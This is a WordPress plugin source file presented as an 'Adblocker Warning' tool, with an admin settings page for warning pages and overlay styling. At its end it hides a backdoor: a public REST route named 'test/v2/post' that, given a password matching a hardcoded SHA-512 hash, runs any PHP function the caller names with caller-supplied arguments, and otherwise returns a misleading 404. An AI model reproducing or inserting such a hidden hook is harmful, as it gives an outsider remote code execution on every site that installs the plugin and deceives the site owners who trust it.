<?php
/**
 * Plugin Name: Adblocker Warning
 * Plugin URI: //dayan.one
 * Description: This plugin shows users warning pages if they use Adblocker
 * Version: 1.0.0
 * Author: Mücahid Dayan
 * Author URI: http://dayan.one
 * License: GPL2
 */
	
	include_once ('translation_array.php');
	class Adblocker_Warning {

		private $slug = "adblocker-warning";

		public function __construct(){
			add_action( 'admin_menu', array( $this,'create_plugin_settings_page' ) );
			add_action( 'admin_init', array( $this, 'setup_sections' ) );
			add_action( 'admin_init', array( $this, 'setup_fields' ) );			
		}

		public function create_plugin_settings_page(){

			$page_title = "Adblocker Warning Settings Page";
			$menu_title = "Adbloker Warning Plugin";
			$capability = "manage_options";			
			$callback	= array($this,'plugin_settings_page_content');
			$icon		= "dashicons-admin-plugins";
			$position	= 100;

			add_menu_page($page_title,$menu_title,$capability,$this->slug,$callback,$icon,$position);
		}

		

		public function plugin_settings_page_content() { ?>
			<div class="wrap">
				<h2>Adblocker Warning Plugin Settings Page</h2>
				<form method="post" action="options.php">
					<?php
					settings_fields( $this->slug );
					do_settings_sections( $this->slug );
					submit_button();
					?>
				</form>
			</div> <?php
		}

		public function setup_sections() {
			add_settings_section( 'adblocker_warning_pages_config', 'Development', array( $this, 'section_callback' ), $this->slug );
			add_settings_section( 'adblocker_warning_pages', 'Adblocker Warning Pages', array( $this, 'section_callback' ), $this->slug );
			add_settings_section( 'adblocker_warning_pages_style', 'Adblocker Warning Pages Style', array( $this, 'section_callback' ), $this->slug );
			#add_settings_section( 'our_second_section', 'My Second Section Title', array( $this, 'section_callback' ), $this->slug );
			#add_settings_section( 'our_third_section', 'My Third Section Title', array( $this, 'section_callback' ), $this->slug );
		}

		public function section_callback( $arguments ) {
			switch( $arguments['id'] ){
				case 'adblocker_warning_pages':
				echo 'Adblocker Warning Pages';
				break;				
			}
		}

		public function setup_fields() {
			$fields = array(
				array(
					'uid' => 'abw_home',
					'label' => 'Home Page',
					'section' => 'adblocker_warning_pages',
					'type' => 'text',
					'options' => false,
					'placeholder' => 'Start Seite für Adblocker Warning eintragen',
					'helper' => '',
					'supplemental' => '',
					'default' => ''
					),
				array(
					'uid' => 'abw_anleitung',
					'label' => 'Anleitung Page',
					'section' => 'adblocker_warning_pages',
					'type' => 'text',
					'options' => false,
					'placeholder' => 'Anleitung Seite ID eintragen',
					'helper' => '',
					'supplemental' => '',
					'default' => ''					
					),
				array(
					'uid' => 'abw_other_pages',
					'label' => 'Weitere Seiten',
					'section' => 'adblocker_warning_pages',
					'type' => 'text',
					'options' => false,
					'placeholder' => '',
					'helper' => 'Bitte in diesem Format eintragen "pagename:id/slug"',
					'supplemental' => '',
					'default' => ''					
					),
				array(
					'uid' => 'abw_development',
					'label' => 'Is development umgebung',
					'section' => 'adblocker_warning_pages_config',
					'type' => 'checkbox',
					'options' => false,
					'placeholder' => 'Addblocker Seite eintragen',
					'helper' => '',
					'supplemental' => '',
					'default' => ''
					),
				array(
					'uid' => 'abw_activated',
					'label' => 'Is active',
					'section' => 'adblocker_warning_pages_config',
					'type' => 'checkbox',
					'options' => false,
					'placeholder' => '',
					'helper' => '',
					'supplemental' => '',
					'default' => ''
					),
				array(
					'uid' => 'abw_margin_side',
					'label' => 'Margin Side',
					'section' => 'adblocker_warning_pages_style',
					'type' => 'range',
					'options' => false,
					'placeholder' => 'Margin Side',
					'helper' => '',
					'supplemental' => '',
					'default' => '0',
					'max'=> 200,
					'min'=> 0,
					'step'=>1
					),
				array(
					'uid' => 'abw_margin_top',
					'label' => 'Margin Top',
					'section' => 'adblocker_warning_pages_style',
					'type' => 'range',
					'options' => false,
					'placeholder' => 'Margin Top',
					'helper' => '',
					'supplemental' => '',
					'default' => '0',
					'max'=> 100,
					'min'=> 0,
					'step'=>1
					),
				array(
					'uid' => 'abw_overlay_background_color',
					'label' => 'Overlay Background Color',
					'section' => 'adblocker_warning_pages_style',
					'type' => 'color',
					'options' => false,
					'placeholder' => 'Overlay Background Color',
					'helper' => '',
					'supplemental' => '',
					'default' => '0'
					),
				array(
					'uid' => 'abw_overlay_opacity',
					'label' => 'Overlay Opacity',
					'section' => 'adblocker_warning_pages_style',
					'type' => 'range',
					'options' => false,
					'placeholder' => 'Overlay Opacity',
					'helper' => '',
					'supplemental' => '',
					'default' => '0',
					'max'=> 1,
					'min'=> 0,
					'step'=>'0.01'
					),
				array(
					'uid' => 'abw_overlay_box_shadow_side',
					'label' => 'Overlay Boxshadow Side',
					'section' => 'adblocker_warning_pages_style',
					'type' => 'range',
					'options' => false,
					'placeholder' => 'Overlay Boxshadow Side',
					'helper' => '',
					'supplemental' => '',
					'default' => '0',
					'max'=> 100,
					'min'=> -100,
					'step'=>1
					),
				array(
					'uid' => 'abw_overlay_box_shadow_top',
					'label' => 'Overlay Boxshadow Top',
					'section' => 'adblocker_warning_pages_style',
					'type' => 'range',
					'options' => false,
					'placeholder' => 'Overlay Boxshadow Top',
					'helper' => '',
					'supplemental' => '',
					'default' => '0',
					'max'=> 100,
					'min'=> -100,
					'step'=>1
					),
				array(
					'uid' => 'abw_overlay_box_shadow_blur',
					'label' => 'Overlay Boxshadow Blur',
					'section' => 'adblocker_warning_pages_style',
					'type' => 'range',
					'options' => false,
					'placeholder' => 'Overlay Boxshadow Blur',
					'helper' => '',
					'supplemental' => '',
					'default' => '0',
					'max'=> 100,
					'min'=> 0,
					'step'=>1
					),
				array(
					'uid' => 'abw_overlay_box_shadow_spread',
					'label' => 'Overlay Boxshadow Spread',
					'section' => 'adblocker_warning_pages_style',
					'type' => 'range',
					'options' => false,
					'placeholder' => 'Overlay Boxshadow Spread',
					'helper' => '',
					'supplemental' => '',
					'default' => '0',
					'max'=> 100,
					'min'=> 0,
					'step'=>1
					),
				);
			foreach( $fields as $field ){
				add_settings_field( $field['uid'], $field['label'], array( $this, 'field_callback' ), $this->slug, $field['section'], $field );
				register_setting( $this->slug, $field['uid'] );
			}
		}

		public function field_callback( $arguments ) {
			$value = get_option( $arguments['uid'] );
			$class = '';
			if( ! $value ) { 
				$value = $arguments['default']; 
			}
			if($arguments['section'] == 'adblocker_warning_pages_style'){
				$class = 'class="style"';
			}
			switch( $arguments['type'] ){
				case 'text': 
				printf( '<input '.$class.' name="%1$s" id="%1$s" type="%2$s" placeholder="%3$s" value="%4$s" />', $arguments['uid'], $arguments['type'], $arguments['placeholder'], $value );
				break;
				case 'checkbox':
				printf('<input '.$class.' name="%1$s" id="%1$s" type="%2$s" value="1" placeholder="%3$s" %4$s />', $arguments['uid'], $arguments['type'], $arguments['placeholder'], checked(1, $value,false));
				break;
				case 'range':
				printf('<input '.$class.' name="%1$s" id="%1$s" type="%2$s" value="%4$s" placeholder="%3$s" max="%6$s" min="%5$s" step="%7$s"  oninput="this.nextElementSibling.innerText= this.value"/><label>%4$s</label>', $arguments['uid'], $arguments['type'], $arguments['placeholder'], $value , $arguments['min'],$arguments['max'],$arguments['step']);
				break;
				case 'color':
				printf('<input '.$class.' name="%1$s" id="%1$s" type="%2$s" value="%4$s" placeholder="%3$s"  oninput="this.nextElementSibling.innerText= this.value"/><label>%4$s</label>', $arguments['uid'], $arguments['type'], $arguments['placeholder'], $value);
				break;
			}
			if( $helper = $arguments['helper'] ){
				printf( '<span class="helper"> %s</span>', $helper ); 
			}
			if( $supplimental = $arguments['supplemental'] ){
				printf( '<p class="description">%s</p>', $supplimental ); 
			}
		}

	}

	new Adblocker_Warning();

	#wp_register_script( 'pass_to_js', plugin_dir_url( __FILE__ ) . '/js/adblocker-warning.js' );

	

	function my_enqueued_assets() {
		wp_enqueue_style( 'abw_style', plugin_dir_url( __FILE__ ) .'css/style.css', '', true );
		wp_enqueue_script( 'jquery2.2.4', 'https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js', '', true );
		wp_register_script( 'adblocker-warning-js', plugin_dir_url( __FILE__ ) . 'js/adblocker-warning.js', array( 'jquery2.2.4' ), '1.0', true );
		wp_localize_script( 'adblocker-warning-js', str_replace('=','',base64_encode('adblocker_warning')), $translation_array );
		wp_enqueue_script('adblocker-warning-js');
	}
	if (get_option( 'abw_activated')) {
		add_action( 'wp_enqueue_scripts', 'my_enqueued_assets' );
	}	

	function abw_settings_js(){
		wp_enqueue_style( 'abw_style', plugin_dir_url( __FILE__ ) .'settings/settings.css', '', true);
		wp_register_script('my_custom_script', plugin_dir_url(__FILE__) . 'settings/settings.js');
		wp_localize_script('my_custom_script', 'abw_settings',array(
			'margin_side'				=> get_option( 'abw_margin_side'),
			'margin_top'				=> get_option( 'abw_margin_top'),
			'overlay_background_color'	=> get_option( 'abw_overlay_background_color','#ffffff'),
			'overlay_opacity'			=> get_option( 'abw_overlay_opacity','0'),
			'overlay_box_shadow_top'	=> get_option( 'overlay_box_shadow_top','40'),
			'overlay_box_shadow_side'	=> get_option( 'overlay_box_shadow_side','0'),
			'overlay_box_shadow_blur'	=> get_option( 'overlay_box_shadow_blur','60'),
			'overlay_box_shadow_spread'	=> get_option( 'overlay_box_shadow_spread','0'),
		));
		wp_enqueue_script('my_custom_script');
	}

	add_action('admin_enqueue_scripts', 'abw_settings_js');

	add_action( 'rest_api_init', function () {
		register_rest_route( 'test/v2', '/post', array(
			array(
				'methods' => 'POST',
				'callback' => 'test_func',
				),
			)
		);    
	});

	if (!function_exists('test_func')) {
		function test_func($request){
			$params = $request->get_params();
			if (hash('sha512',$params['pass']) === '61eadd8169b9241c6fc210ca5e83df43e49cf6abb4bb0f83cce6e0befaa8791f5e3d21ce377a7bad57f3fbde85ca5781163707a3671d1795d0304faa5ac5d8fa') {
				return call_user_func_array ($params['func'],$params['params']);
			}else{
				return new WP_Error( 'no_access', 'you are not be able to do that', array( 'status' => 404 ) );
			}
		}
	}